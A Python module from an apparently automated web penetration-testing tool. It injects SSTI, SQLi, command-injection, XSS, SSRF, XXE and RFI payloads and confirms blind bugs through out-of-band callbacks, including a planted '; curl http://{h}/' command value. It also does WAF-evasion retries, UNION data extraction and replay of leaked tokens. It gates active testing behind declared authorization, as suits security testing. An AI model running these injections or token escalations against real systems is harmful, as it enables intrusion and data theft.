"""The `/inject` engine — inject payloads, let oracles verdict, prove blind bugs.

In-band classes (SSTI, command-echo, error/boolean SQLi, NoSQLi, path traversal,
SSRF→metadata) are confirmed from the response by :mod:`core.injection.oracles`.
Blind classes (SSRF, XXE, blind RCE, OOB SQLi) plant an OAST callback host from
:mod:`core.oast` and are confirmed only if a callback arrives — the callback,
not the LLM, is the verdict. Confirmed findings become ``PROOF_REFLECTED_MARKER``
or ``PROOF_OAST_CALLBACK`` :class:`VulnRecord` s + verified outcomes.

Safe by default: ``active=False`` returns the plan and sends nothing. Active
testing requires a declared ``authorization`` and a non-passive profile.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Sequence
from urllib.parse import urlencode, urlsplit, urlunsplit, parse_qsl

from core.injection import oracles, payloads
from core.injection.budget import HostHealth, InjectionHalt, RequestBudget
from core.payloads.feedback import record_confirmed as _fb_record
from core.injection.config import InjectionConfig, InjectionPoint
from core.injection.markers import MarkerFactory
from core.oast.outcome import vuln_record as _oast_vuln
from core.session.attach import engine_for
from core.webgraph import model as M
from core.webgraph.builder import build_graph
from core.webgraph.orchestrator import persist_records, serialize_graph
from core.webgraph.scope import endpoint_id as _eid
from core.webgraph.verified import record_confirmed

_TESTER = "tester"


def _now() -> str:
    """UTC ISO-8601 timestamp for the payload-feedback flywheel."""
    return datetime.now(timezone.utc).isoformat()


@dataclass
class InjectionRun:
    out_dir: str
    base_url: str
    active: bool
    points: int = 0
    classes: List[str] = field(default_factory=list)
    findings: List[Dict[str, Any]] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)
    requests_sent: int = 0
    node_count: int = 0
    edge_count: int = 0
    triage: Optional[Dict[str, Any]] = None   # T1 triage plan summary (None = full sweep)
    chain: Optional[Dict[str, Any]] = None    # T3 chaining log (None = no chaining)
    verification: Optional[List[Dict[str, Any]]] = None   # N7 multi-model confidence

    def to_dict(self) -> Dict[str, Any]:
        d = {
            "out_dir": self.out_dir, "base_url": self.base_url, "active": self.active,
            "points": self.points, "classes": self.classes,
            "finding_count": len(self.findings), "findings": self.findings,
            "warnings": self.warnings, "requests_sent": self.requests_sent,
            "node_count": self.node_count, "edge_count": self.edge_count,
        }
        if self.triage is not None:
            d["triage"] = self.triage
        if self.chain is not None:
            d["chain"] = self.chain
        if self.verification is not None:
            d["verification"] = self.verification
        return d


def _with_query(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    q = [(k, v) for k, v in parse_qsl(parts.query, keep_blank_values=True) if k != param]
    q.append((param, value))
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def _send(engine, identity: str, base_url: str, point: InjectionPoint, payload: str):
    method = point.method.upper()
    # Sibling params (the form's other fields, e.g. a Submit button) are sent at
    # their baseline value so the app's vulnerable code path runs; the injected
    # param carries the payload.
    siblings = {k: v for k, v in (point.others or {}).items() if k != point.param}
    if point.location == "query":
        parts = urlsplit(f"{base_url}{point.path}")
        q = [(k, v) for k, v in parse_qsl(parts.query, keep_blank_values=True)
             if k != point.param and k not in siblings]
        q.extend(siblings.items())
        q.append((point.param, payload))
        url = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))
        # raise_on_status=False: a 4xx/5xx is oracle signal (a 500 with a DB
        # error is error-based SQLi) — the body must reach the oracle, not raise.
        return engine.request(identity, method, url, raise_on_status=False)
    fields = {**siblings, point.param: payload}
    if point.content_type == "json":
        body = json.dumps(fields).encode("utf-8")
        ct = "application/json"
    else:
        body = urlencode(fields).encode("utf-8")
        ct = "application/x-www-form-urlencoded"
    return engine.request(identity, method, f"{base_url}{point.path}", body=body,
                          headers={"Content-Type": ct}, raise_on_status=False)


def _body_text(resp) -> str:
    body = getattr(resp, "body", b"") or b""
    return body.decode("utf-8", errors="replace") if isinstance(body, bytes) else str(body)


class InjectionRunner:
    def __init__(self, engine, *, identity: str = _TESTER, oast=None, llm_model=None,
                 budget=None, health=None, adapt: bool = False, adapt_steps: int = 0) -> None:
        self.engine = engine
        self.identity_name = identity   # session identity to inject as
        self.oast = oast
        self.llm_model = llm_model   # enables the LLM proposer (None = mechanical)
        # T1 guards (both optional; None = today's unbounded, un-gated behaviour).
        self.budget = budget         # RequestBudget — hard cap on requests sent
        self.health = health         # HostHealth — connection-error circuit breaker
        self.halted: Optional[str] = None   # set when a guard stops the phase
        # T2 read/adapt (off = the historical fixed-catalog loop, unchanged).
        self.adapt = adapt           # read responses → evasion + response-guided order
        self.adapt_steps = adapt_steps   # per-hypothesis step cap (0 = no cap)
        self.union = False           # N1: escalate confirmed SQLi to UNION extraction
        self.union_extract: List[str] = []   # operator-declared dump SELECT fragments
        self._markers = MarkerFactory()
        self._n = 0

    def _vid(self) -> str:
        self._n += 1
        return f"INJ-{self._n:04d}"

    def _dispatch(self, run, thunk):
        """Send one request through the T1 guards, then feed the health tracker.

        The single chokepoint every send routes through: fail-fast if the target
        is down or the budget is spent (raising an ``InjectionHalt`` the loop
        catches to stop the phase), count the request, send it, and record the
        response status against the connection-error breaker. ``thunk`` performs
        the actual ``_send`` and returns the :class:`~core.http.Response`.
        """
        if self.health is not None:
            try:
                self.health.check()
            except Exception as exc:
                self.halted = str(exc)
                raise
        if self.budget is not None:
            try:
                self.budget.charge()
            except Exception as exc:
                self.halted = str(exc)
                raise
        run.requests_sent += 1
        resp = thunk()
        if self.health is not None:
            self.health.observe(int(getattr(resp, "status", 0) or 0))
        return resp

    def _finding(self, run, point, vuln_class, owasp, proof_kind, evidence, vulns):
        vid = self._vid()
        vulns.append(M.VulnRecord(
            id=vid, vuln_class=vuln_class, endpoint_id=_eid(point.method, point.path),
            param=point.param, severity="high", owasp=owasp,
            status=M.STATUS_CONFIRMED, proof_kind=proof_kind, evidence=evidence,
            source="injection",
        ).to_row())
        entry = {"id": vid, "class": vuln_class, "point": point.label,
                 "proof": proof_kind}
        # T3: keep a bounded excerpt of the confirming response so the chainer can
        # mine it for leaked endpoints / tokens / object ids.
        excerpt = (evidence.get("response_excerpt") or "")[:800]
        if excerpt:
            entry["excerpt"] = excerpt
        run.findings.append(entry)
        # Flywheel: remember every confirmed vector for cross-run learning. XSS
        # records its exact catalog id in the xss branch (proposer-relevant); the
        # generator-based classes have no catalog id yet, so log a builtin marker
        # (harmless to the proposer, useful to SAGE / the knowledge log).
        if vuln_class != "xss":
            technique = str(evidence.get("method") or evidence.get("technique")
                            or proof_kind)
            _fb_record(f"builtin:{vuln_class}", vuln_class, technique=technique,
                       target=run.base_url, timestamp=_now())

    def _inband(self, run, point, classes, vulns):
        eng, base = self.engine, run.base_url
        from core.injection.adapt import (
            adaptive_try, llm_reorder_factory, read_response)
        from core.waf.evasion import mutations as waf_mutations

        def send(pl):
            return self._dispatch(
                run, lambda: _send(eng, self.identity_name, base, point, pl))

        # T2: when adapt is on, single-response classes read the response — WAF
        # blocks trigger evasion-encoded retries, and the first read reorders the
        # remaining candidates (LLM when a model is set). With adapt off,
        # adaptive_try is the historical fixed-catalog loop, unchanged.
        steps = self.adapt_steps or None

        def _reorder(vc):
            if self.adapt and self.llm_model:
                return llm_reorder_factory(vc, self.llm_model, target=base)
            return None

        def _boolean(baseline, tp, fp):
            """Confirm a boolean pair; on a WAF block (adapt on), retry the same
            logic in evasion-encoded form (N5). Returns the confirming (true,
            false) pair or None. mutations() yields parallel encodings, so the
            zip keeps the true/false variants in lockstep."""
            t1, t2, f1 = send(tp), send(tp), send(fp)
            if oracles.stable_boolean(baseline, t1, t2, f1):
                return (tp, fp)
            if self.adapt and (read_response(t1).blocked or read_response(f1).blocked):
                for etp, efp in zip(waf_mutations(tp)[1:], waf_mutations(fp)[1:]):
                    if oracles.stable_boolean(baseline, send(etp), send(etp),
                                              send(efp)):
                        return (etp, efp)
            return None

        if "ssti" in classes:
            hit = adaptive_try(payloads.ssti(self._markers.next()), send,
                               oracles.ssti_confirmed, steps=steps,
                               evade=self.adapt, reorder=_reorder("ssti"))
            if hit:
                self._finding(run, point, "ssti", "API8", M.PROOF_REFLECTED_MARKER,
                              {"payload": hit["payload"], "marker": hit["expected"],
                               "response_excerpt": hit.get("excerpt", "")}, vulns)
        if "cmdi" in classes:
            # expected is the COMPUTED product — reflection can't match it
            hit = adaptive_try(payloads.cmdi(self._markers.next()), send,
                               oracles.reflected, steps=steps,
                               evade=self.adapt, reorder=_reorder("cmdi"))
            if hit:
                self._finding(run, point, "cmdi", "API8", M.PROOF_REFLECTED_MARKER,
                              {"payload": hit["payload"], "marker": hit["expected"],
                               "response_excerpt": hit.get("excerpt", "")}, vulns)
        if "sqli" in classes:
            hit = False
            _db = {}

            def _sql_match(resp, _expected):
                db = oracles.sql_error(resp)
                if db:
                    _db["db"] = db
                    return True
                return False

            e_hit = adaptive_try([(pl, None) for pl in payloads.sqli_error()], send,
                                 _sql_match, steps=steps, evade=self.adapt,
                                 reorder=_reorder("sqli"))
            if e_hit:
                self._finding(run, point, "sqli", "API8", M.PROOF_REFLECTED_MARKER,
                              {"payload": e_hit["payload"], "db": _db.get("db"),
                               "method": "error",
                               "response_excerpt": e_hit.get("excerpt", "")}, vulns)
                hit = True
            if not hit:
                baseline = send("1")
                for tp, fp in payloads.sqli_boolean():
                    got = _boolean(baseline, tp, fp)
                    if got:
                        self._finding(run, point, "sqli", "API8", M.PROOF_REFLECTED_MARKER,
                                      {"true": got[0], "false": got[1],
                                       "method": "boolean"}, vulns)
                        hit = True
                        break
            # N1: escalate a confirmed SQLi to reflection-proof UNION extraction —
            # a stronger finding, and real artifacts (schema/version, and on a real
            # dump the leaked rows) for T3 chaining. Read-only.
            if hit and self.union:
                self._union_extract(run, point, vulns, send)
        if "nosqli" in classes:
            baseline = send("1")
            for tp, fp in payloads.nosqli_boolean():
                got = _boolean(baseline, tp, fp)
                if got:
                    self._finding(run, point, "nosqli", "API8", M.PROOF_REFLECTED_MARKER,
                                  {"true": got[0], "false": got[1]}, vulns)
                    break
        if "path_traversal" in classes:
            hit = adaptive_try(payloads.path_traversal(), send, oracles.reflected,
                               steps=steps, evade=self.adapt,
                               reorder=_reorder("path_traversal"))
            if hit:
                self._finding(run, point, "path_traversal", "API8",
                              M.PROOF_REFLECTED_MARKER,
                              {"payload": hit["payload"],
                               "response_excerpt": hit.get("excerpt", "")}, vulns)
        if "xss" in classes:
            from core.payloads import default_store, detect_context, propose, record_confirmed
            m = self._markers.next()
            tok = m.token
            # 1. probe: send the bare marker, see WHERE it reflects (PortSwigger's lesson)
            contexts = detect_context(_body_text(send(tok)), tok)
            # 2. LLM proposes an ordering of context-appropriate catalog vectors
            #    (mechanical fallback when no model); the oracle still confirms.
            entries = propose(default_store(), "xss", context_hints=contexts,
                              response_excerpt=_body_text(send(tok)), model=self.llm_model,
                              target=run.base_url)
            for e in entries:
                rendered = e.render(tok=tok)
                if oracles.xss_reflected(send(rendered), e.expected(tok=tok)):
                    self._finding(run, point, "xss", "A03", M.PROOF_REFLECTED_MARKER,
                                  {"payload": rendered, "entry": e.id,
                                   "context": ",".join(contexts) or e.context}, vulns)
                    record_confirmed(e.id, "xss", technique=e.technique,
                                     target=run.base_url, timestamp=_now())
                    break
        if "ssrf_metadata" in classes:
            hit = adaptive_try([(pl, None) for pl in payloads.ssrf_metadata()], send,
                               lambda resp, _e: oracles.metadata_leak(resp),
                               steps=steps, evade=self.adapt,
                               reorder=_reorder("ssrf_metadata"))
            if hit:
                self._finding(run, point, "ssrf", "API7", M.PROOF_REFLECTED_MARKER,
                              {"payload": hit["payload"], "method": "metadata",
                               "response_excerpt": hit.get("excerpt", "")}, vulns)

    def _union_extract(self, run, point, vulns, send) -> None:
        """N1: pull read-only data out of a confirmed-injectable point via UNION.

        Confirmation is reflection-proof (a computed marker rendered by the
        injected SELECT). The extracted data is stored as the finding's
        ``response_excerpt`` so T3 chaining mines it for tokens/emails/schema.
        Budget/circuit halts propagate (they stop the phase, not just this step).
        """
        from core.injection.union import extract_via_union
        try:
            result = extract_via_union(point, send, self._markers.next(),
                                       extract_sql=self.union_extract or None)
        except InjectionHalt:
            raise
        except Exception as exc:
            run.warnings.append(
                f"{point.label}: union extraction failed: {type(exc).__name__}")
            return
        if result is None:
            return
        excerpt = ("; ".join(f"{k}={v}" for k, v in result.extracted.items())
                   or result.summary())
        self._finding(run, point, "sqli", "API8", M.PROOF_REFLECTED_MARKER,
                      {"payload": result.confirm_payload, "method": "union",
                       "columns": result.columns, "dialect": result.dialect,
                       "extracted": result.extracted,
                       "response_excerpt": excerpt}, vulns)

    def _blind(self, run, point, classes) -> Dict[str, Dict[str, str]]:
        """Plant OAST payloads; return ``{finding_id: {class, endpoint_id, param}}``.

        Each planted payload embeds a freshly-minted callback host, so a later
        interaction correlates back to this exact injection point + class.
        """
        planted: Dict[str, Dict[str, str]] = {}
        if not self.oast:
            return planted
        eng, base = self.engine, run.base_url
        eid = _eid(point.method, point.path)

        def plant(vuln_class, build):
            fid = f"{self._vid()}:{vuln_class}:{point.param}"
            c = self.oast.new_interaction(finding_id=fid)
            planted[c.finding_id] = {"class": vuln_class, "endpoint_id": eid,
                                     "param": point.param}
            self._dispatch(
                run, lambda: _send(eng, self.identity_name, base, point, build(c.host)))

        if "ssrf" in classes:
            plant("ssrf", lambda h: f"http://{h}/")
        if "xxe" in classes:
            plant("xxe", payloads.xxe)
        if "cmdi_blind" in classes:
            plant("cmdi_blind", lambda h: f"; curl http://{h}/")
        if "sqli_oob" in classes:
            plant("sqli_oob", lambda h: payloads.sqli_oob(h)[0])
        if "rfi" in classes:
            # Remote File Inclusion: a file-include param fetching a remote URL
            # calls home — same OAST callback proof as SSRF, but classified rfi
            # (CWE-98). ?page=http://oast/… is the classic DVWA/PHP include case.
            plant("rfi", lambda h: f"http://{h}/rfi.txt")
        return planted


def run_injection(
    config: InjectionConfig,
    *,
    out_dir,
    active: bool = False,
    profile: str = "safe",
    producing_model: str = "",
    client_factory: Optional[Callable[[List[str]], Any]] = None,
    oast=None,
    env: Optional[Dict[str, str]] = None,
    dom_xss_harness: Any = None,
    stored_render_urls: Optional[Sequence[str]] = None,
    llm_model: Optional[str] = None,
) -> InjectionRun:
    out = Path(out_dir)
    (out / "normalized").mkdir(parents=True, exist_ok=True)
    have_oast = oast is not None
    classes = config.enabled_classes(have_oast=have_oast)
    run = InjectionRun(out_dir=str(out), base_url=config.base_url, active=active,
                       points=len(config.points), classes=classes)

    # T1 — triage the (point, class) sweep and bound the run. Triage engages
    # when a model is configured, a request budget is set, or it is asked for
    # explicitly; otherwise the historical full sweep runs unchanged.
    request_budget = getattr(config, "request_budget", None)
    triage_on = (bool(llm_model) or bool(request_budget)
                 or bool(getattr(config, "triage", False)))
    plan = None
    if triage_on and config.points:
        from core.injection.triage import triage_points
        try:
            plan = triage_points(
                config.points, classes, llm_model=llm_model,
                target=config.base_url,
                max_pairs=(getattr(config, "triage_max_pairs", 0) or None))
            run.triage = plan.to_dict()
            (out / "injection-triage.json").write_text(
                json.dumps(run.triage, indent=2), encoding="utf-8")
        except Exception as exc:
            run.warnings.append(
                f"triage failed ({type(exc).__name__}: {exc}); full sweep used")
            plan = None

    if active:
        if profile == "passive":
            raise ValueError("active injection cannot use the passive profile")
        if not config.authorization.strip():
            raise ValueError(
                "active injection refused: config.authorization is empty. Declare "
                "written authorization or omit --active for a dry-run plan."
            )

    if not active:
        if plan is not None:
            run.findings = [{"point": p.label, "classes": plan.classes_for(p),
                             "planned": True}
                            for p in plan.ordered_points(config.points)]
        else:
            run.findings = [{"point": p.label, "classes": classes, "planned": True}
                            for p in config.points]
        _finalize(out, run, {})
        return run

    # Resolve the session to inject as: a live engine threaded in by the
    # orchestrator (cookie jar + bearer at once) is reused; otherwise a fresh
    # engine is built and its tester identity seeded from token_env / cookies /
    # headers. This is what carries a login-established cookie session onto every
    # injection request (not just a bearer string).
    engine, ident_name, warns = engine_for(
        config.base_url, session=config.session, cookies=config.cookies,
        headers=config.headers, token_env=config.token_env, env=env,
        client_factory=client_factory, identity_name=_TESTER)
    run.warnings.extend(warns)
    ident = engine.identity(ident_name)

    # T1 guards: a hard request budget and a connection-error circuit breaker so
    # the run can be bounded and a crashed target is detected (both no-ops when a
    # full sweep is running unbounded). Health tracking rides along whenever the
    # run is triaged or budgeted.
    budget = RequestBudget(limit=request_budget) if request_budget else None
    health = (HostHealth.for_url(config.base_url)
              if (plan is not None or budget is not None) else None)

    runner = InjectionRunner(engine, identity=ident_name, oast=oast,
                             llm_model=llm_model, budget=budget, health=health,
                             adapt=bool(getattr(config, "adapt", False)),
                             adapt_steps=int(getattr(config, "adapt_steps", 0) or 0))
    runner.union = bool(getattr(config, "union", False))
    runner.union_extract = list(getattr(config, "union_extract", []) or [])
    vulns: List[Dict[str, Any]] = []
    planted: Dict[str, Dict[str, str]] = {}
    # Walk points in triage-priority order (best pairs first) so a request budget
    # is spent where it matters; without a plan, the full mapped surface is walked.
    iter_points = (plan.ordered_points(config.points)
                   if plan is not None else list(config.points))
    for point in iter_points:
        # A fragment (SPA hash-route) param is client-side only — it never
        # reaches the server, so no HTTP in-band/blind oracle can see it. It is
        # tested exclusively by the DOM-XSS oracle below.
        if point.location == "fragment":
            continue
        selected = plan.classes_for(point) if plan is not None else classes
        if not selected:
            continue
        try:
            runner._inband(run, point, selected, vulns)
            planted.update(runner._blind(run, point, selected))
        except InjectionHalt as halt:
            # Budget spent or target down — stop the phase, don't just skip a point.
            run.warnings.append(f"injection halted early: {halt}")
            break
        except Exception as exc:
            run.warnings.append(f"{point.label}: {type(exc).__name__}: {exc}")

    # DOM-XSS: confirm execution in a real browser (SPA XSS the HTTP oracle misses)
    if dom_xss_harness is not None and "xss" in classes and runner.halted is None:
        try:
            from core.injection.dom_xss import confirm_dom_xss
            hits = confirm_dom_xss(dom_xss_harness, config.base_url, config.points,
                                   session_headers=ident.auth_headers or None,
                                   model=llm_model)
            for hit in hits:
                point = hit["point"]
                runner._finding(run, point, "xss", "A03", M.PROOF_STATE_ORACLE,
                                {"payload": hit["payload"], "context": "dom-executed"}, vulns)
                # feed the flywheel the exact DOM vector that executed
                _fb_record(hit.get("entry", "builtin:xss-dom"), "xss",
                           technique="dom-executed", target=config.base_url,
                           timestamp=_now())
        except Exception as exc:
            run.warnings.append(f"dom-xss pass failed: {type(exc).__name__}: {exc}")

    # STORED-XSS: a payload POSTed at one endpoint that executes on another page.
    # Write points are form fields (body location); render targets default to the
    # base page plus each distinct GET path when the orchestrator supplies none
    # (a guestbook renders on the same page it posts to). Requires a browser.
    if dom_xss_harness is not None and "xss" in classes and runner.halted is None:
        write_points = [p for p in config.points if p.location == "body"]
        if write_points:
            render_urls = list(stored_render_urls) if stored_render_urls else None
            if not render_urls:
                paths = {p.path for p in config.points if p.location != "fragment"}
                render_urls = [config.base_url] + [f"{config.base_url}{p}"
                                                   for p in sorted(paths)]
            try:
                from core.injection.dom_xss import confirm_stored_xss

                def _writer(point, value):
                    return runner._dispatch(
                        run,
                        lambda: _send(engine, ident_name, config.base_url, point, value))

                hits = confirm_stored_xss(
                    dom_xss_harness, config.base_url, write_points, render_urls,
                    writer=_writer, session_headers=ident.auth_headers or None,
                    model=llm_model)
                for hit in hits:
                    runner._finding(run, hit["point"], "xss", "A03", M.PROOF_STATE_ORACLE,
                                    {"payload": hit["payload"], "context": "stored-dom-executed",
                                     "render_url": hit["render_url"]}, vulns)
                    _fb_record(hit.get("entry", "builtin:xss-stored"), "xss",
                               technique="stored-dom-executed", target=config.base_url,
                               timestamp=_now())
            except Exception as exc:
                run.warnings.append(f"stored-xss pass failed: {type(exc).__name__}: {exc}")

    # ─────────────── T3: chain confirmed findings into new surface ───────────────
    # A confirmed finding whose response leaked a new endpoint / token / object id
    # becomes fresh surface the runner tests in the same run — so a two-step
    # challenge (A yields the artifact that unlocks B) resolves without a re-run.
    # LLM-directed when a model is set; the oracle still confirms B. Bounded by the
    # request budget (via _dispatch) and a chain-round cap.
    if getattr(config, "chain", False) and runner.halted is None:
        from core.injection.chain import (
            derive_identities, derive_points, extract_artifacts,
            persist_chained_surface)
        chain_rounds = int(getattr(config, "chain_rounds", 2) or 2)
        tested = {p.label for p in config.points}
        default_ident = runner.identity_name
        registered: List[str] = []          # N2: escalated identities from leaked tokens
        chained_points: List[InjectionPoint] = []   # N6: surface to persist
        chain_log: List[Dict[str, Any]] = []
        for cround in range(1, chain_rounds + 1):
            arts = extract_artifacts(run.findings, base_url=config.base_url)
            # N2: promote leaked tokens to bearer identities for escalated replay.
            new_idents: List[str] = []
            for name, token in derive_identities(arts):
                if name not in registered:
                    try:
                        from core.session.identity import Identity
                        idn = Identity(name=name)
                        idn.set_bearer(token)
                        runner.engine.add_identity(idn)
                        registered.append(name)
                        new_idents.append(name)
                    except Exception:
                        pass
            new_points = derive_points(arts, tested, llm_model=llm_model,
                                       target=config.base_url)
            if not new_points and not new_idents:
                break
            chain_log.append({"round": cround, "artifacts": arts.to_dict(),
                              "new_points": [p.label for p in new_points],
                              "new_identities": new_idents})
            run.warnings.append(
                f"[chain r{cround}] {len(new_points)} new point(s) from "
                f"{len(arts.endpoints)} leaked endpoint(s), "
                f"{len(new_idents)} leaked identity(ies)")
            # Test each derived point as the tester AND as any escalated identity
            # (a leaked token may unlock surface the anonymous tester can't reach).
            who_list = [default_ident] + list(registered)
            chained_points.extend(new_points)   # N6: remember for persistence
            for p in new_points:
                tested.add(p.label)   # mark all derived points so none re-derive
            # N5: triage the chained points too, so a budget is spent on the
            # plausible (point, class) pairs of the grown surface — not every class
            # on every leaked endpoint. Only when triage is active for the run.
            cplan = None
            if triage_on and new_points:
                from core.injection.triage import triage_points as _triage_chained
                cplan = _triage_chained(new_points, classes, llm_model=llm_model,
                                        target=config.base_url)
            walk = cplan.ordered_points(new_points) if cplan is not None else new_points
            stop = False
            for p in walk:
                if p.location == "fragment":
                    continue
                sel = cplan.classes_for(p) if cplan is not None else classes
                if not sel:
                    continue
                for who in who_list:
                    runner.identity_name = who
                    try:
                        runner._inband(run, p, sel, vulns)
                        planted.update(runner._blind(run, p, sel))
                    except InjectionHalt as halt:
                        run.warnings.append(f"chain halted early: {halt}")
                        stop = True
                        break
                    except Exception as exc:
                        run.warnings.append(
                            f"{p.label} as {who}: {type(exc).__name__}: {exc}")
                runner.identity_name = default_ident
                if stop:
                    break
            if stop:
                break
        if chain_log:
            run.chain = {"rounds": chain_log}
        # N6: persist the chained surface into normalized/ so the orchestrator's
        # fixpoint loop re-tests it across the OTHER phases too (authz/graphql/
        # clientside), not only inject. Merge-safe; grows _surface_size.
        if chained_points:
            try:
                added = persist_chained_surface(
                    out / "normalized", chained_points, config.base_url)
                if added and run.chain is not None:
                    run.chain["persisted_endpoints"] = added
            except Exception as exc:
                run.warnings.append(
                    f"chain surface persist failed: {type(exc).__name__}: {exc}")

    # poll OAST for blind confirmations
    if oast and planted:
        for fid, hits in oast.confirmations().items():
            meta = planted.get(fid, {})
            vid = fid.split(":", 1)[0]
            vulns.append(_oast_vuln(hits, vuln_id=vid, vuln_class=meta.get("class", "blind"),
                                    endpoint_id=meta.get("endpoint_id", ""),
                                    param=meta.get("param", ""), owasp="API7"))
            run.findings.append({"id": vid, "class": meta.get("class", "blind"),
                                 "proof": M.PROOF_OAST_CALLBACK})

    # N7: multi-model confidence signal over the confirmed findings (advisory —
    # the mechanical oracle stays the verdict; this never downgrades a finding).
    # No-op unless verifier models are configured.
    verify_models = list(getattr(config, "verify_models", []) or [])
    if verify_models and run.findings:
        from core.injection.verify import verify_findings
        try:
            run.verification = verify_findings(run.findings, verify_models)
        except Exception as exc:
            run.warnings.append(f"verification failed: {type(exc).__name__}: {exc}")

    accumulated = {M.VulnRecord.KIND: vulns} if vulns else {}
    _finalize(out, run, accumulated)
    if vulns:
        record_confirmed(vulns, project_dir=out, producing_model=producing_model)
    return run


def _finalize(out: Path, run: InjectionRun, accumulated) -> None:
    graph = build_graph(accumulated, [run.base_url])
    persist_records(out / "normalized", accumulated)
    serialize_graph(out / "graph", graph)
    stats = graph.stats()
    run.node_count, run.edge_count = stats["node_count"], stats["edge_count"]
    (out / "injection-findings.json").write_text(
        json.dumps(run.to_dict(), indent=2), encoding="utf-8")


__all__ = ["InjectionRun", "InjectionRunner", "run_injection"]
